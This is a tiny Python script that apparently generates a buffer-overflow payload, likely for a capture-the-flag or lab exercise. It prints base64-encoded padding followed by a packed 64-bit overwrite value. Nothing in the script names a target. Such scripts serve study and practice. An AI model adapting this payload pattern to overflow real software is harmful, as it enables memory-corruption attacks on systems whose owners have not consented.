
import sys
import struct
import base64

buf = b'zzzzzzzzzzzzzzzzzzzzzzzzzzz'
buf += struct.pack('<Q', 17054703308747890130)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
